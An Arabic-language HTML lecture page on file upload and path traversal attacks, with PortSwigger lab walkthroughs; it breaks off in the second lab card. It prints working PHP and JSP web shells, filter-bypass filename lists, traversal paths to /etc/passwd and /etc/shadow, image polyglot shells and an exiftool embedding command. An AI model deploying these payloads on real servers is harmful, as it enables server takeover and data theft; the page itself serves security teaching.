<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>محاضرة File Upload + Path Traversal - أمان تطبيقات الويب</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/themes/prism-okaidia.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Google Sans', 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            line-height: 1.6;
            color: #e8eaed;
            background: #151b2f;
            min-height: 100vh;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            text-align: center;
            margin-bottom: 48px;
            padding: 64px 24px;
            background: linear-gradient(135deg, #1a2125, #203942);
            border-radius: 12px;
            box-shadow: 0 4px 24px rgb(33, 48, 70);
        }

        .header h1 {
            font-size: 2.75rem;
            font-weight: 400;
            color: #ffffff;
            margin-bottom: 16px;
            letter-spacing: -0.5px;
        }

        .header .subtitle {
            font-size: 1.25rem;
            font-weight: 300;
            color: rgba(255, 255, 255, 0.9);
            margin-bottom: 24px;
        }

        .lecture-info {
            display: flex;
            justify-content: center;
            gap: 30px;
            flex-wrap: wrap;
            margin-top: 20px;
        }

        .info-item {
            background: rgba(255, 255, 255, 0.2);
            padding: 12px 24px;
            border-radius: 24px;
            border: 1px solid rgba(255, 255, 255, 0.3);
            color: #ffffff;
            font-weight: 500;
        }

        .info-item i {
            color: #ffffff;
            margin-left: 8px;
        }

        .nav-menu {
            background: #1a2332;
            border-radius: 12px;
            padding: 24px;
            margin-bottom: 32px;
            border: 1px solid #2d3748;
            box-shadow: 0 1px 6px rgba(26, 35, 50, 0.4);
        }

        .nav-menu h3 {
            color: #e8eaed;
            font-size: 1.5rem;
            font-weight: 500;
            margin-bottom: 20px;
            text-align: center;
        }

        .nav-menu ul {
            list-style: none;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 10px;
        }

        .nav-menu li {
            background: #1e2a3a;
            border-radius: 8px;
            transition: all 0.2s ease;
            margin-bottom: 4px;
        }

        .nav-menu li:hover {
            background: rgba(66, 165, 245, 0.15);
            transform: translateX(-2px);
        }

        .nav-menu a {
            color: #9aa0a6;
            text-decoration: none;
            padding: 12px 16px;
            display: block;
            border-radius: 8px;
            font-weight: 500;
        }

        .nav-menu a:hover {
            color: #42a5f5;
        }

        .section {
            background: #1a2332;
            margin-bottom: 32px;
            border-radius: 12px;
            padding: 32px;
            border: 1px solid #2d3748;
            box-shadow: 0 1px 6px rgba(26, 35, 50, 0.4);
        }

        .section-title {
            color: #e8eaed;
            font-size: 2.125rem;
            font-weight: 500;
            margin-bottom: 24px;
            text-align: center;
            border-bottom: 2px solid #42a5f5;
            padding-bottom: 16px;
        }

        .subsection-title {
            color: #42a5f5;
            font-size: 1.375rem;
            font-weight: 500;
            margin: 32px 0 16px 0;
            padding: 16px 20px;
            background: rgba(66, 165, 245, 0.1);
            border-right: 4px solid #42a5f5;
            border-radius: 8px;
        }

        .highlight-box {
            background: #1e2a3a;
            border: 1px solid #2d3748;
            border-radius: 12px;
            padding: 24px;
            margin: 24px 0;
            color: #e8eaed;
        }

        .highlight-box h4 {
            color: #42a5f5;
            margin-bottom: 12px;
            font-size: 1.125rem;
            font-weight: 500;
        }

        .lab-card {
            background: #1a2332;
            border: 1px solid #2d3748;
            border-radius: 12px;
            padding: 24px;
            margin: 24px 0;
            color: #e8eaed;
            box-shadow: 0 2px 10px rgba(26, 35, 50, 0.4);
            transition: all 0.2s ease;
        }

        .lab-card:hover {
            box-shadow: 0 4px 20px rgba(33, 48, 70, 0.6);
            transform: translateY(-2px);
            border-color: #42a5f5;
        }

        .lab-title {
            color: #81c784;
            font-size: 1.25rem;
            font-weight: 500;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .lab-url {
            background: #1e2a3a;
            border: 1px solid #2d3748;
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 16px;
            word-break: break-all;
            transition: all 0.2s ease;
        }

        .lab-url:hover {
            background: rgba(66, 165, 245, 0.1);
            border-color: #42a5f5;
        }

        .lab-url a {
            display: flex;
            align-items: center;
            gap: 8px;
            transition: all 0.2s ease;
            color: #42a5f5;
            text-decoration: none;
            font-weight: 500;
        }

        .lab-url a:hover {
            color: #90caf9 !important;
        }

        .step-list {
            list-style: none;
            counter-reset: step-counter;
        }

        .step-list li {
            counter-increment: step-counter;
            margin: 12px 0;
            padding: 12px 16px;
            background: #1e2a3a;
            border-right: 3px solid #81c784;
            border-radius: 8px;
            position: relative;
            color: #e8eaed;
        }

        .step-list li::before {
            content: counter(step-counter);
            position: absolute;
            right: -15px;
            top: 50%;
            transform: translateY(-50%);
            background: #81c784;
            color: #151b2f;
            width: 24px;
            height: 24px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 500;
            font-size: 0.875rem;
        }

        .payload-box {
            background: #131925;
            border: 1px solid #2d3748;
            border-radius: 8px;
            padding: 16px;
            margin: 16px 0;
            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
            color: #42a5f5;
            overflow-x: auto;
            font-size: 0.875rem;
        }

        .payload-box code {
            color: #81c784;
        }

        .warning-box {
            background: #2a1f1f;
            border: 1px solid #ff9800;
            border-radius: 12px;
            padding: 20px;
            margin: 20px 0;
            color: #e8eaed;
        }

        .warning-box h4 {
            color: #ff5722;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 12px;
            font-weight: 500;
        }

        .tips-box {
            background: #1e2a3a;
            border: 1px solid #42a5f5;
            border-radius: 12px;
            padding: 20px;
            margin: 20px 0;
            color: #e8eaed;
        }

        .tips-box h4 {
            color: #42a5f5;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 12px;
            font-weight: 500;
        }

        .code-example {
            background: #131925;
            border: 1px solid #2d3748;
            border-radius: 8px;
            padding: 20px;
            margin: 15px 0;
            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
            font-size: 0.875rem;
            overflow-x: auto;
            color: #e8eaed;
        }

        .secure-code {
            border-color: #4caf50;
        }

        .vulnerable-code {
            border-color: #f44336;
        }

        .attack-flow {
            background: rgba(66, 165, 245, 0.1);
            border: 2px dashed #42a5f5;
            border-radius: 12px;
            padding: 24px;
            margin: 24px 0;
            text-align: center;
        }

        .attack-step {
            display: inline-block;
            background: #42a5f5;
            color: #151b2f;
            padding: 12px 16px;
            margin: 6px;
            border-radius: 24px;
            font-weight: 500;
            font-size: 0.875rem;
        }

        .arrow {
            color: #42a5f5;
            font-size: 1.25rem;
            margin: 0 8px;
        }

        .conclusion {
            background: linear-gradient(135deg, #1a2125, #1c3f4d);
            border-radius: 12px;
            padding: 48px 32px;
            margin-top: 48px;
            text-align: center;
            color: #ffffff;
            box-shadow: 0 4px 24px rgb(33, 48, 70);
        }

        .conclusion h2 {
            color: #ffffff;
            font-weight: 400;
            font-size: 2rem;
            margin-bottom: 24px;
        }

        .back-home {
            display: inline-block;
            background: rgba(255, 255, 255, 0.2);
            color: white;
            padding: 16px 32px;
            border-radius: 24px;
            text-decoration: none;
            margin-top: 24px;
            transition: all 0.2s ease;
            border: 1px solid rgba(255, 255, 255, 0.3);
            font-weight: 500;
        }

        .back-home:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        }

        @media (max-width: 768px) {
            .container {
                padding: 10px;
            }

            .header h1 {
                font-size: 2em;
            }

            .section {
                padding: 20px;
            }

            .lecture-info {
                flex-direction: column;
                align-items: center;
            }

            .nav-menu ul {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1><i class="fas fa-upload"></i> محاضرة File Upload + Path Traversal</h1>
            <div class="subtitle">الجزء الثالث من سلسلة الهجمات من جانب الخادم</div>
            <div class="lecture-info">
                <div class="info-item">
                    <i class="fas fa-clock"></i>
                    المدة: ساعتان
                </div>
                <div class="info-item">
                    <i class="fas fa-flask"></i>
                    المختبرات: 13 مختبر
                </div>
                <div class="info-item">
                    <i class="fas fa-shield-alt"></i>
                    المستوى: متوسط إلى متقدم
                </div>
            </div>
        </div>

        <div class="nav-menu">
            <h3><i class="fas fa-list"></i> فهرس المحاضرة</h3>
            <ul>
                <li><a href="#introduction"><i class="fas fa-play"></i> مقدمة</a></li>
                <li><a href="#file-upload-basics"><i class="fas fa-upload"></i> أساسيات رفع الملفات</a></li>
                <li><a href="#file-upload-types"><i class="fas fa-bug"></i> أنواع ثغرات رفع الملفات</a></li>
                <li><a href="#file-upload-labs"><i class="fas fa-flask"></i> 7 مختبرات رفع الملفات</a></li>
                <li><a href="#path-traversal-basics"><i class="fas fa-folder-open"></i> أساسيات Path Traversal</a></li>
                <li><a href="#path-traversal-types"><i class="fas fa-route"></i> أنواع Path Traversal</a></li>
                <li><a href="#path-traversal-labs"><i class="fas fa-vials"></i> 6 مختبرات Path Traversal</a></li>
                <li><a href="#prevention"><i class="fas fa-shield-virus"></i> طرق الحماية</a></li>
                <li><a href="#conclusion"><i class="fas fa-trophy"></i> الخلاصة</a></li>
            </ul>
        </div>

        <!-- مقدمة -->
        <div id="introduction" class="section">
            <h2 class="section-title"><i class="fas fa-play"></i> مقدمة</h2>
            
            <div class="highlight-box">
                <h4><i class="fas fa-info-circle"></i> أهداف المحاضرة</h4>
                <ul>
                    <li>فهم آليات عمل ثغرات رفع الملفات وأنواعها المختلفة</li>
                    <li>إتقان تقنيات Path Traversal للوصول للملفات الحساسة</li>
                    <li>تطبيق تقنيات تجاوز الفلاتر والحماية</li>
                    <li>تنفيذ Web Shells للسيطرة على الخوادم</li>
                    <li>تطبيق طرق الحماية الفعالة ضد هذه الهجمات</li>
                </ul>
            </div>

            <p>ثغرات <strong>File Upload</strong> و <strong>Path Traversal</strong> من أخطر الثغرات في تطبيقات الويب. تسمح ثغرات رفع الملفات للمهاجمين بتحميل ملفات خبيثة قد تؤدي إلى تنفيذ أوامر على الخادم، بينما تمكن ثغرات Path Traversal من الوصول للملفات الحساسة خارج المجلد المحدد.</p>

            <div class="attack-flow">
                <div class="attack-step">رفع ملف خبيث</div>
                <span class="arrow">→</span>
                <div class="attack-step">تجاوز الفلاتر</div>
                <span class="arrow">→</span>
                <div class="attack-step">تنفيذ Web Shell</div>
                <span class="arrow">→</span>
                <div class="attack-step">السيطرة على الخادم</div>
            </div>
        </div>

        <!-- أساسيات رفع الملفات -->
        <div id="file-upload-basics" class="section">
            <h2 class="section-title"><i class="fas fa-upload"></i> أساسيات ثغرات رفع الملفات</h2>

            <div class="highlight-box">
                <h4><i class="fas fa-question-circle"></i> ما هي ثغرات File Upload؟</h4>
                <p>ثغرات تحدث عندما تسمح تطبيقات الويب برفع ملفات دون فحص مناسب لنوعها أو محتواها أو اسمها، مما يتيح للمهاجمين رفع ملفات خبيثة قد تؤدي إلى تنفيذ أوامر على الخادم.</p>
            </div>

            <h3 class="subsection-title"><i class="fas fa-cogs"></i> آلية عمل ثغرات رفع الملفات</h3>
            
            <div class="payload-box">
                <strong>مثال على طلب رفع ملف:</strong><br>
                <code>POST /upload HTTP/1.1<br>
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary<br><br>
                ------WebKitFormBoundary<br>
                Content-Disposition: form-data; name="file"; filename="shell.php"<br>
                Content-Type: application/x-php<br><br>
                &lt;?php echo system($_GET['cmd']); ?&gt;<br>
                ------WebKitFormBoundary--</code>
            </div>

            <h3 class="subsection-title"><i class="fas fa-exclamation-triangle"></i> مخاطر ثغرات رفع الملفات</h3>
            
            <div class="warning-box">
                <h4><i class="fas fa-skull-crossbones"></i> التأثيرات الخطيرة</h4>
                <ul>
                    <li><strong>Remote Code Execution (RCE):</strong> تنفيذ أوامر على الخادم</li>
                    <li><strong>Web Shell:</strong> السيطرة الكاملة على الخادم</li>
                    <li><strong>Defacement:</strong> تشويه الموقع</li>
                    <li><strong>Data Exfiltration:</strong> سرقة البيانات الحساسة</li>
                    <li><strong>Malware Distribution:</strong> توزيع البرمجيات الخبيثة</li>
                </ul>
            </div>
        </div>

        <!-- أنواع ثغرات رفع الملفات -->
        <div id="file-upload-types" class="section">
            <h2 class="section-title"><i class="fas fa-bug"></i> أنواع ثغرات رفع الملفات</h2>

            <h3 class="subsection-title"><i class="fas fa-unlock"></i> 1. Unrestricted File Upload</h3>
            <div class="highlight-box">
                <h4><i class="fas fa-info-circle"></i> التحليل التقني المعمق</h4>
                <p><strong>ثغرة Unrestricted File Upload</strong> تحدث عندما يفشل التطبيق في تطبيق أي آليات تحقق أو تصفية على الملفات المرفوعة. هذا النوع من الثغرات يعتبر الأخطر على الإطلاق لأنه يتيح للمهاجم تحميل أي نوع من الملفات دون قيود.</p>
                
                <p><strong>الآلية التقنية:</strong></p>
                <ul>
                    <li>التطبيق يقبل المدخل من المستخدم مباشرة دون فحص</li>
                    <li>لا يوجد فحص لامتداد الملف (File Extension)</li>
                    <li>لا يوجد فحص لنوع المحتوى (MIME Type)</li>
                    <li>لا يوجد فحص للبيانات الداخلية (Magic Bytes)</li>
                </ul>

                <p><strong>سيناريو الهجوم الكامل:</strong></p>
                <div class="payload-box">
                    <strong>المرحلة 1 - إنشاء Web Shell متقدم:</strong><br>
                    <code>&lt;?php<br>
                    if(isset($_GET['cmd'])) {<br>
                    &nbsp;&nbsp;&nbsp;&nbsp;$cmd = $_GET['cmd'];<br>
                    &nbsp;&nbsp;&nbsp;&nbsp;$output = shell_exec($cmd . ' 2>&1');<br>
                    &nbsp;&nbsp;&nbsp;&nbsp;echo "&lt;pre&gt;" . htmlspecialchars($output) . "&lt;/pre&gt;";<br>
                    }<br>
                    ?&gt;</code>
                </div>

                <div class="payload-box">
                    <strong>المرحلة 2 - استخدام Web Shell:</strong><br>
                    <code>GET /uploads/shell.php?cmd=whoami HTTP/1.1<br>
                    GET /uploads/shell.php?cmd=cat /etc/passwd<br>
                    GET /uploads/shell.php?cmd=netstat -tulnp</code>
                </div>

                <p><strong>التأثير الأمني:</strong></p>
                <ul>
                    <li><strong>Remote Code Execution (RCE):</strong> تنفيذ أوامر على مستوى نظام التشغيل</li>
                    <li><strong>Data Exfiltration:</strong> سرقة قواعد البيانات والملفات الحساسة</li>
                    <li><strong>Privilege Escalation:</strong> رفع الصلاحيات داخل النظام</li>
                    <li><strong>Lateral Movement:</strong> الانتشار في الشبكة الداخلية</li>
                    <li><strong>Persistent Access:</strong> إنشاء backdoors دائمة</li>
                </ul>
            </div>

            <h3 class="subsection-title"><i class="fas fa-file-code"></i> 2. Content-Type Bypass</h3>
            <div class="highlight-box">
                <h4><i class="fas fa-info-circle"></i> التحليل التقني المعمق</h4>
                <p><strong>ثغرة Content-Type Bypass</strong> تستغل الثقة الخاطئة التي يضعها المطورون في HTTP headers القابلة للتحكم من قبل المستخدم. هذه الثغرة شائعة جداً في التطبيقات التي تعتمد فقط على فحص MIME Type للتحقق من نوع الملف.</p>
                
                <p><strong>الفهم العميق للمشكلة:</strong></p>
                <ul>
                    <li><strong>Client-Side Control:</strong> المستخدم يتحكم بالكامل في HTTP headers</li>
                    <li><strong>Server-Side Trust:</strong> الخادم يثق في البيانات القادمة من العميل</li>
                    <li><strong>Validation Gap:</strong> عدم وجود فحص إضافي للمحتوى الفعلي</li>
                </ul>

                <p><strong>الطلب الطبيعي vs الطلب المعدل:</strong></p>
                <div class="payload-box">
                    <strong>الطلب الطبيعي (يتم رفضه):</strong><br>
                    <code>POST /upload HTTP/1.1<br>
                    Content-Type: multipart/form-data; boundary=boundary123<br><br>
                    --boundary123<br>
                    Content-Disposition: form-data; name="file"; filename="evil.php"<br>
                    Content-Type: application/x-php<br><br>
                    &lt;?php system($_GET['cmd']); ?&gt;<br>
                    --boundary123--</code>
                </div>

                <div class="payload-box">
                    <strong>الطلب المعدل (يتم قبوله):</strong><br>
                    <code>POST /upload HTTP/1.1<br>
                    Content-Type: multipart/form-data; boundary=boundary123<br><br>
                    --boundary123<br>
                    Content-Disposition: form-data; name="file"; filename="evil.php"<br>
                    Content-Type: image/jpeg    // مُزيف<br><br>
                    &lt;?php system($_GET['cmd']); ?&gt;<br>
                    --boundary123--</code>
                </div>

                <p><strong>تقنيات التجاوز المتقدمة:</strong></p>
                <ul>
                    <li><strong>MIME Type Spoofing:</strong> استخدام أنواع MIME مختلفة</li>
                    <li><strong>Charset Manipulation:</strong> تعديل charset في Content-Type</li>
                    <li><strong>Boundary Confusion:</strong> استغلال parsing errors في multipart</li>
                </ul>

                <div class="payload-box">
                    <strong>أمثلة تقنيات متقدمة:</strong><br>
                    <code>Content-Type: image/jpeg; charset=utf-8<br>
                    Content-Type: text/plain<br>
                    Content-Type: application/octet-stream<br>
                    Content-Type: multipart/mixed</code>
                </div>
            </div>

            <h3 class="subsection-title"><i class="fas fa-ban"></i> 3. Extension Blacklist Bypass</h3>
            <div class="highlight-box">
                <h4><i class="fas fa-info-circle"></i> التحليل التقني المعمق</h4>
                <p><strong>ثغرة Extension Blacklist Bypass</strong> تستغل القصور في آليات منع الامتدادات الخطيرة. المشكلة الأساسية هي أن الـ Blacklisting يعتمد على قائمة محدودة من الامتدادات المحظورة، بينما يوجد المئات من الامتدادات القابلة للتنفيذ.</p>
                
                <p><strong>لماذا تفشل قوائم المنع؟</strong></p>
                <ul>
                    <li><strong>Incomplete Coverage:</strong> من المستحيل حصر جميع الامتدادات الخطيرة</li>
                    <li><strong>Server Variations:</strong> خوادم مختلفة تدعم امتدادات مختلفة</li>
                    <li><strong>Configuration Dependencies:</strong> الامتدادات تعتمد على إعدادات الخادم</li>
                    <li><strong>Evolution Factor:</strong> امتدادات جديدة تظهر باستمرار</li>
                </ul>

                <p><strong>التصنيف الشامل لتقنيات التجاوز:</strong></p>

                <div class="payload-box">
                    <strong>1. Alternative Extensions (امتدادات بديلة):</strong><br>
                    <code>// PHP Alternatives<br>
                    .php3, .php4, .php5, .php7, .php8<br>
                    .phtml, .pht, .phps, .phar, .phpt<br>
                    .inc, .hphp, .ctp<br><br>

                    // ASP.NET Alternatives<br>
                    .asp, .aspx, .ascx, .ashx, .asmx<br>
                    .axd, .config, .cs, .vb<br><br>

                    // JSP Alternatives<br>
                    .jsp, .jspx, .jsw, .jsv, .jspf<br>
                    .war, .ear, .jar</code>
                </div>

                <div class="payload-box">
                    <strong>2. Case Manipulation (تلاعب الأحرف):</strong><br>
                    <code>shell.PHP       // Upper case<br>
                    shell.Php       // Mixed case<br>
                    shell.pHp       // Random case<br>
                    shell.PhP       // Alternate case</code>
                </div>

                <div class="payload-box">
                    <strong>3. Null Byte Injection:</strong><br>
                    <code>shell.php%00.jpg     // URL encoded null byte<br>
                    shell.php\x00.png    // Hex null byte<br>
                    shell.php;.gif       // Semicolon (some parsers)<br>
                    shell.php:.jpg       // Colon (Windows)</code>
                </div>

                <div class="payload-box">
                    <strong>4. Double Extensions:</strong><br>
                    <code>shell.php.jpg        // Simple double<br>
                    shell.jpg.php        // Reverse double<br>
                    image.php.jpeg       // Camouflaged<br>
                    file.txt.php         // Text disguise</code>
                </div>

                <div class="payload-box">
                    <strong>5. Trailing Characters:</strong><br>
                    <code>shell.php.          // Trailing dot<br>
                    shell.php..         // Multiple dots<br>
                    shell.php           // Trailing space<br>
                    shell.php%20        // URL encoded space</code>
                </div>

                <div class="payload-box">
                    <strong>6. Unicode/UTF-8 Bypass:</strong><br>
                    <code>shell.php%C0%2E     // Overlong encoding<br>
                    shell.php%C0%AE      // UTF-8 overlong<br>
                    shell.php%EF%BC%8E   // Fullwidth period</code>
                </div>

                <p><strong>تقنية الـ Nested Removal:</strong></p>
                <p>بعض التطبيقات تحاول إزالة الامتدادات الخطيرة، لكن تفعل ذلك مرة واحدة فقط:</p>
                <div class="payload-box">
                    <code>shell.p.phphp       // يصبح shell.php بعد إزالة .php مرة واحدة<br>
                    file.as.aspp        // يصبح file.asp<br>
                    evil.ph.phptml      // يصبح evil.phtml</code>
                </div>
            </div>

            <h3 class="subsection-title"><i class="fas fa-folder"></i> 4. Path Traversal in Upload</h3>
            <div class="highlight-box">
                <h4><i class="fas fa-info-circle"></i> التحليل التقني المعمق</h4>
                <p><strong>ثغرة Path Traversal في File Upload</strong> تمثل تهديداً مضاعفاً حيث تجمع بين خطورة رفع الملفات الخبيثة وخطورة التحكم في مكان حفظها. هذا يتيح للمهاجم رفع ملفات في مجلدات قابلة للتنفيذ أو الكتابة فوق ملفات نظام حساسة.</p>
                
                <p><strong>الفهم العميق للثغرة:</strong></p>
                <ul>
                    <li><strong>Directory Traversal:</strong> التنقل خارج المجلد المخصص للتحميل</li>
                    <li><strong>File Overwrite:</strong> الكتابة فوق ملفات النظام المهمة</li>
                    <li><strong>Executable Placement:</strong> وضع الملفات في مجلدات قابلة للتنفيذ</li>
                    <li><strong>Configuration Hijacking:</strong> تعديل ملفات الإعداد</li>
                </ul>

                <p><strong>سيناريوهات الهجوم المتقدمة:</strong></p>

                <div class="payload-box">
                    <strong>1. الهروب إلى Web Root:</strong><br>
                    <code>filename="../../../var/www/html/backdoor.php"<br>
                    filename="../../../../apache2/htdocs/shell.jsp"<br>
                    filename="../../../public_html/webshell.aspx"</code>
                </div>

                <div class="payload-box">
                    <strong>2. الكتابة فوق ملفات النظام:</strong><br>
                    <code>filename="../../../etc/passwd"          // Linux users<br>
                    filename="../../../etc/shadow"          // Password hashes<br>
                    filename="../../../../Windows/system32/drivers/etc/hosts"</code>
                </div>

                <div class="payload-box">
                    <strong>3. تعديل ملفات الإعداد:</strong><br>
                    <code>filename="../.htaccess"              // Apache config<br>
                    filename="../web.config"             // IIS config<br>
                    filename="../../../etc/apache2/apache2.conf"</code>
                </div>

                <div class="payload-box">
                    <strong>4. استغلال Symbolic Links:</strong><br>
                    <code>// إنشاء symbolic link إلى ملف حساس<br>
                    filename="../../../tmp/link_to_passwd"<br>
                    // المحتوى: ملف يحتوي على symbolic link</code>
                </div>

                <p><strong>التقنيات المتقدمة للتجاوز:</strong></p>

                <div class="payload-box">
                    <strong>URL Encoding Variations:</strong><br>
                    <code>filename="..%2f..%2f..%2fetc%2fpasswd"         // Standard encoding<br>
                    filename="..%252f..%252f..%252fetc%252fpasswd"   // Double encoding<br>
                    filename="..%c0%af..%c0%af..%c0%afetc%c0%afpasswd" // UTF-8 overlong</code>
                </div>

                <div class="payload-box">
                    <strong>OS-Specific Techniques:</strong><br>
                    <code>// Windows<br>
                    filename="..\\..\\..\\windows\\system32\\cmd.exe"<br>
                    filename="..%5c..%5c..%5cwindows%5csystem32%5ccmd.exe"<br><br>

                    // Unix/Linux<br>
                    filename="../../../bin/sh"<br>
                    filename="..%2f..%2f..%2fbin%2fsh"</code>
                </div>

                <p><strong>تأثيرات الأمان المتقدمة:</strong></p>
                <ul>
                    <li><strong>System Compromise:</strong> السيطرة الكاملة على النظام</li>
                    <li><strong>Service Disruption:</strong> تعطيل الخدمات عبر الكتابة فوق الملفات</li>
                    <li><strong>Privilege Escalation:</strong> رفع الصلاحيات عبر تعديل ملفات النظام</li>
                    <li><strong>Data Integrity Loss:</strong> فقدان سلامة البيانات</li>
                </ul>
            </div>

            <h3 class="subsection-title"><i class="fas fa-image"></i> 5. Magic Bytes / File Header Bypass</h3>
            <div class="highlight-box">
                <h4><i class="fas fa-info-circle"></i> التحليل التقني المعمق</h4>
                <p><strong>ثغرة Magic Bytes Bypass</strong> تستغل الطريقة التي تتعامل بها التطبيقات مع فحص محتوى الملفات. Magic Bytes هي البايتات الأولى من الملف التي تحدد نوعه الحقيقي، وهي طريقة أكثر موثوقية من فحص الامتداد أو MIME type.</p>
                
                <p><strong>فهم Magic Bytes:</strong></p>
                <p>كل نوع ملف له signature فريد في البداية. هذه الـ signatures تُستخدم من قبل نظام التشغيل والتطبيقات لتحديد نوع الملف بصرف النظر عن امتداده.</p>

                <div class="payload-box">
                    <strong>Magic Bytes الشائعة:</strong><br>
                    <code>// Image Files<br>
                    JPEG: FF D8 FF E0 00 10 4A 46 49 46    // ÿØÿà..JFIF<br>
                    PNG:  89 50 4E 47 0D 0A 1A 0A          // .PNG....<br>
                    GIF:  47 49 46 38 39 61                // GIF89a<br>
                    BMP:  42 4D                            // BM<br><br>

                    // Archive Files<br>
                    ZIP:  50 4B 03 04                      // PK..<br>
                    RAR:  52 61 72 21 1A 07 00             // Rar!...<br>
                    7Z:   37 7A BC AF 27 1C                // 7z¼¯'..<br><br>

                    // Document Files<br>
                    PDF:  25 50 44 46 2D                   // %PDF-<br>
                    DOC:  D0 CF 11 E0 A1 B1 1A E1          // Ðϑà¡±.á</code>
                </div>

                <p><strong>تقنيات Polyglot Files:</strong></p>
                <p>الهدف هو إنشاء ملف يحتوي على magic bytes صحيحة مع كود خبيث قابل للتنفيذ.</p>

                <div class="payload-box">
                    <strong>JPEG + PHP Polyglot:</strong><br>
                    <code>FF D8 FF E0 00 10 4A 46 49 46 00 01    // JPEG Header<br>
                    &lt;?php<br>
                    /* JPEG Comment Section - يخفي الكود */<br>
                    if(isset($_GET['c'])) {<br>
                    &nbsp;&nbsp;&nbsp;&nbsp;echo "&lt;pre&gt;";<br>
                    &nbsp;&nbsp;&nbsp;&nbsp;system($_GET['c']);<br>
                    &nbsp;&nbsp;&nbsp;&nbsp;echo "&lt;/pre&gt;";<br>
                    }<br>
                    // باقي بيانات JPEG...<br>
                    ?&gt;</code>
                </div>

                <div class="payload-box">
                    <strong>PNG + PHP Polyglot:</strong><br>
                    <code>89 50 4E 47 0D 0A 1A 0A              // PNG Signature<br>
                    00 00 00 0D 49 48 44 52              // IHDR chunk<br>
                    // PNG metadata...<br>
                    &lt;?php system($_GET['cmd']); ?&gt;<br>
                    // PNG data continues...</code>
                </div>

                <div class="payload-box">
                    <strong>GIF + JSP Polyglot:</strong><br>
                    <code>GIF89a                                // GIF Header<br>
                    &lt;%@ page import="java.io.*" %&gt;<br>
                    &lt;%<br>
                    if (request.getParameter("cmd") != null) {<br>
                    &nbsp;&nbsp;&nbsp;&nbsp;Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));<br>
                    &nbsp;&nbsp;&nbsp;&nbsp;// باقي الكود...<br>
                    }<br>
                    %&gt;</code>
                </div>

                <p><strong>تقنيات متقدمة لتجاوز الفحص:</strong></p>

                <div class="payload-box">
                    <strong>1. EXIF Data Injection (JPEG):</strong><br>
                    <code>// إخفاء PHP code في EXIF metadata<br>
                    JPEG Header + EXIF data containing:<br>
                    &lt;?php eval($_GET['e']); ?&gt;</code>
                </div>

                <div class="payload-box">
                    <strong>2. PNG tEXt Chunk Abuse:</strong><br>
                    <code>// استخدام PNG text chunks لإخفاء الكود<br>
                    PNG Header<br>
                    tEXt chunk: "&lt;?php system($_GET['c']); ?&gt;"</code>
                </div>

                <div class="payload-box">
                    <strong>3. ZIP Comment Injection:</strong><br>
                    <code>// إخفاء كود في ZIP file comment<br>
                    ZIP Header<br>
                    ZIP Comment: "&lt;?php include($_GET['f']); ?&gt;"</code>
                </div>

                <p><strong>أدوات إنشاء Polyglot Files:</strong></p>
                <div class="payload-box">
                    <code>// باستخدام ExifTool<br>
                    exiftool -Comment='&lt;?php system($_GET["c"]); ?&gt;' image.jpg<br><br>

                    // باستخدام hexedit لتعديل البايتات مباشرة<br>
                    hexedit malicious_image.jpg<br><br>

                    // إنشاء polyglot يدوياً<br>
                    python polyglot_generator.py --type jpeg --payload shell.php</code>
                </div>

                <p><strong>اختبار فعالية Polyglot:</strong></p>
                <ul>
                    <li><strong>File Command:</strong> <code>file malicious.jpg</code> يجب أن يعرض "JPEG image"</li>
                    <li><strong>Image Viewers:</strong> يجب أن تعرض الصورة بشكل طبيعي</li>
                    <li><strong>Web Server:</strong> يجب أن ينفذ PHP code عند الطلب</li>
                </ul>
            </div>
        </div>

        <!-- مختبرات رفع الملفات -->
        <div id="file-upload-labs" class="section">
            <h2 class="section-title"><i class="fas fa-flask"></i> مختبرات رفع الملفات - 7 مختبرات</h2>

            <!-- Lab 1 -->
            <div class="lab-card">
                <div class="lab-title">
                    <i class="fas fa-play"></i>
                    Lab 1: Remote code execution via web shell upload
                </div>
                <div class="lab-url">
                    <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload" target="_blank" style="color: #64b5f6; text-decoration: none;">
                        <i class="fas fa-external-link-alt"></i>
                        https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload
                    </a>
                </div>
                <p><strong>الهدف:</strong> رفع Web Shell بسيط واستخراج ملف سري.</p>
                
                <ol class="step-list">
                    <li>سجل دخول بالبيانات: wiener:peter</li>
                    <li>ارفع صورة كـ avatar ولاحظ المسار في Burp</li>
                    <li>أنشئ ملف exploit.php بالمحتوى: <code>&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;</code></li>
                    <li>ارفع الملف بدلاً من الصورة</li>
                    <li>اطلب الملف المرفوع: <code>GET /files/avatars/exploit.php</code></li>
                    <li>احصل على المحتوى السري وأرسله</li>
                </ol>
            </div>

            <!-- Lab 2 -->
            <div class="lab-card">
                <div class="lab-title">
                    <i class="fas fa-play"></i>
                    Lab 2: Web shell upload via Content-Type restriction bypass
                </div>
                <div class="lab-url">
                    <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass" target="_blank" style="color: #64b5f6; text-decoration: none;">
                        <i class="fas fa-external-link-alt"></i>
